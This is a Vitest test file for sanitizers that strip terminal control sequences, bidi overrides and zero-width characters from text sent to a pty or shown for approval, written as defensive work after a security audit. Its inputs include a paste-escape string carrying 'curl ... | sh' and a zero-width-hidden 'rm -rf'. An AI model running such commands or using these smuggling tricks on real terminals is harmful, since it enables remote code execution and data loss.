import { describe, it, expect } from 'vitest'
import { stripControlChars, hasControlChars, stripInvisibleChars } from './control-chars'

// Security audit 2026-10-01, H2: text written into a lane's pty must not carry bytes that end the
// bracketed paste or act as keys.
describe('stripControlChars', () => {
  it('removes the paste terminator and the keys that would follow it', () => {
    expect(stripControlChars('ok\x1b[201~\x15!curl -s https://host/p|sh\r')).toBe('ok[201~!curl -s https://host/p|sh\n')
    expect(stripControlChars('a\x1b[Zb')).toBe('a[Zb')
  })

  it('removes every C0 control except tab and newline, plus DEL and the C1 range', () => {
    let c0 = ''
    for (let i = 0; i < 0x20; i++) c0 += String.fromCharCode(i)
    expect(stripControlChars(c0)).toBe('\t\n\n') // \t, \n, and \r turned into \n
    expect(stripControlChars('a\x7fb')).toBe('ab')
    expect(stripControlChars('a\x9b201~b\x80\x9f')).toBe('a201~b') // \x9b is the one-byte CSI
  })

  it('keeps line breaks, turning \\r\\n and lone \\r into \\n', () => {
    expect(stripControlChars('one\r\ntwo\rthree\nfour')).toBe('one\ntwo\nthree\nfour')
  })

  it('leaves ordinary text, tabs and non-ASCII alone', () => {
    const s = 'Fix it:\n\t- añade «ñ» and 日本語 → ✓ 🎉'
    expect(stripControlChars(s)).toBe(s)
  })
})

describe('hasControlChars', () => {
  it('flags ESC and other controls, not tab, newline or carriage return', () => {
    expect(hasControlChars('x\x1b[201~')).toBe(true)
    expect(hasControlChars('x\x00')).toBe(true)
    expect(hasControlChars('x\x9b')).toBe(true)
    expect(hasControlChars('a\tb\nc\r\nd')).toBe(false)
  })
})

// Security review 2026-10-02, R1: a note the user approves must display as what it says.
describe('stripInvisibleChars', () => {
  it('removes the bidi embeddings, overrides and isolates', () => {
    expect(stripInvisibleChars('ok \u202edeliver\u202c done')).toBe('ok deliver done')
    let bidi = ''
    for (let i = 0x202a; i <= 0x202e; i++) bidi += String.fromCharCode(i)
    for (let i = 0x2066; i <= 0x2069; i++) bidi += String.fromCharCode(i)
    expect(stripInvisibleChars(`a${bidi}b`)).toBe('ab')
  })

  it('removes the zero-width characters and the BOM', () => {
    expect(stripInvisibleChars('\ufeffr\u200bm\u200c -\u200drf')).toBe('rm -rf')
  })

  it('leaves control characters, line breaks and ordinary text to the other rule', () => {
    const s = 'Fix it:\n\t- añade «ñ» and 日本語 → ✓ \x1b'
    expect(stripInvisibleChars(s)).toBe(s)
  })
})
